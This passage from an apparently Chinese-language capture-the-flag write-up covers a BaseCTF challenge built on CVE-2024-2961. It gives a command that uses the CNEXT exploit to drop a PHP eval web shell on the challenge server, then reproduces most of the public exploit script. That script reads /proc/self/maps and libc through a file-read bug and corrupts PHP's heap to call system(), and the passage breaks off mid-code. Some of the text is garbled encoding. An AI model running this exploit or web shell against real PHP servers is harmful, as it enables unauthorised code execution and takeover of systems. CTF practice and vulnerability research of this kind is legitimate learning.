Ëé∑ÂèñÊúÄÂêé‰∏ÄË°åÔºàÁ¥¢ÂºïÊúÄÂ§ßÁöÑ‰∏ÄË°åÔºâHANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]# 3„ÄÅ‰∏çÈÄöËøáÁ¥¢ÂºïÊü•ÁúãË°®# READ FIRST: Ëé∑ÂèñÂè•ÊüÑÁöÑÁ¨¨‰∏ÄË°å# READ NEXT: ‰æùÊ¨°Ëé∑ÂèñÂÖ∂‰ªñË°åÔºàÂΩìÁÑ∂‰πüÂèØ‰ª•Âú®Ëé∑ÂèñÂè•ÊüÑÂêéÁõ¥Êé•‰ΩøÁî®Ëé∑ÂèñÁ¨¨‰∏ÄË°åÔºâ# ÊúÄÂêé‰∏ÄË°åÊâßË°å‰πãÂêéÂÜçÊâßË°å READ NEXT ‰ºöËøîÂõû‰∏Ä‰∏™Á©∫ÁöÑÁªìÊûúHANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]# ÂÖ≥Èó≠Â∑≤ÊâìÂºÄÁöÑÂè•ÊüÑHANDLER tbl_name CLOSE</code></pre><h4 id="Just-Readme-ÂâçÁΩÆ-CVE-2024-2961"><a href="#Just-Readme-ÂâçÁΩÆ-CVE-2024-2961" class="headerlink" title="Just Readme (ÂâçÁΩÆ)(CVE-2024-2961)"></a>Just Readme (ÂâçÁΩÆ)(CVE-2024-2961)</h4><p>Hint:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a href="https://github.com/ambionics/cnext-exploits">CVE-2024-2961</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">python3 cnext-exploit.py http://challenge.basectf.fun:44169/ <span class="token string">"echo '&lt;?php eval(\<span class="token variable">$_POST</span>[0]);?>'>/var/www/html/hsad.php;"</span></code></pre><p><strong>cnext-exploit.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment">#</span><span class="token comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><span class="token comment"># Date: 2024-05-27</span><span class="token comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><span class="token comment">#</span><span class="token comment"># TODO Parse LIBC to know if patched</span><span class="token comment">#</span><span class="token comment"># INFORMATIONS</span><span class="token comment">#</span><span class="token comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><span class="token comment">#</span><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"ÂäÑ"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A helper class to send the payload and download files.        The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.        The code here serves as an example that attacks a page that looks like:        ```php    &lt;?php        $data = file_get_contents($_POST['file']);    echo "File contents: $data";    ```        Tweak it to fit your target, and start the exploit.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.        """</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> path<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token comment"># ÂåπÈÖçËØ≠Âè•ËÆ∞ÂæóÊ†πÊçÆÈ¢òÁõÆÁéØÂ¢ÉÊõ¥Êîπ</span>        <span class="token comment"># data = response.re.search(b"(.*)", flags=re.S).group(1)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>text        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        """</span>                <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>                    <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> regions    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>        LIBC_FILE <span class="token operator">=</span> <span class="token string">"/dev/shm/cnext-libc"</span>        <span class="token comment"># PHP's heap</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token comment"># Libc</span>        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> region    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"[anon:zend_alloc]"</span><span class="token punctuation">)</span>        <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> first    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""On each step of the exploit, a filter will process each chunk one after the        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That's where the difficulties come from.        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00        By triggering the bug from chunk ..900, we get:        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???        That's step 3.        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That's step 2.        Now, if we were to perform step2 an then step3 without anything else, we'd have        a problem: after step2 has been processed, the free list goes bottom-up, like:        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900        We need to go the other way around. That's why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.        Another problem comes up.        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        "disappear" from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don't know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk>).        We make sure that the "system" command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.        The pad blocks just "pad" our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        """</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token 